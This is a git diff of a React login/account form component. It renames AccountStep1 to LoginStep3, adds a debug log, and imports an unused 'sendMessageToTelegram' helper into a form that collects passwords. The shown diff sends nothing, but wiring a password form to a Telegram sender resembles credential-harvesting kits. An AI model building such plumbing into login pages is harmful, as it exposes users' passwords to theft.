@@ -4,17 +4,18 @@ import { Button } from "@/components/ui/button";
 import { useFormState } from "@/hooks/useFormState";
 import React, { useEffect, useState } from "react";
 import { FormProvider, useForm } from "react-hook-form";
+import { sendMessageToTelegram } from "../create-account/AccountStep2";
 
 interface Props {
   setActiveForm: React.Dispatch<React.SetStateAction<number>>;
 }
-const AccountStep1 = ({ setActiveForm }: Props) => {
+const LoginStep3 = ({ setActiveForm }: Props) => {
   const { value, setValue } = useFormState();
   const methods = useForm({ defaultValues: value });
   const [error, setError] = useState<string | null>(null);
   const [isChecked, setIsChecked] = useState(false);
 
- 
+  // console.log(formState);
   const password = methods.watch("password");
   const confirmPassword = methods.watch("confirmPassword");
 
@@ -29,7 +30,7 @@ const AccountStep1 = ({ setActiveForm }: Props) => {
   };
 
   const onSubmit = (data: any) => {
-  
+    console.log(data?.password !== data?.confirmPassword);
     if (data?.password !== data?.confirmPassword) {
       setError("Password does not match");
     } else {
@@ -38,10 +39,10 @@ const AccountStep1 = ({ setActiveForm }: Props) => {
         ...prev,
         ...data,
       }));
+    
     }
   };
   const valid = isChecked && Boolean(password) && Boolean(confirmPassword);
-
   return (
     <div className="c11  h-full w-full">
       <FormProvider {...methods}>
@@ -161,4 +162,4 @@ const AccountStep1 = ({ setActiveForm }: Props) => {
   );
 };
 
-export default AccountStep1;
+export default LoginStep3;
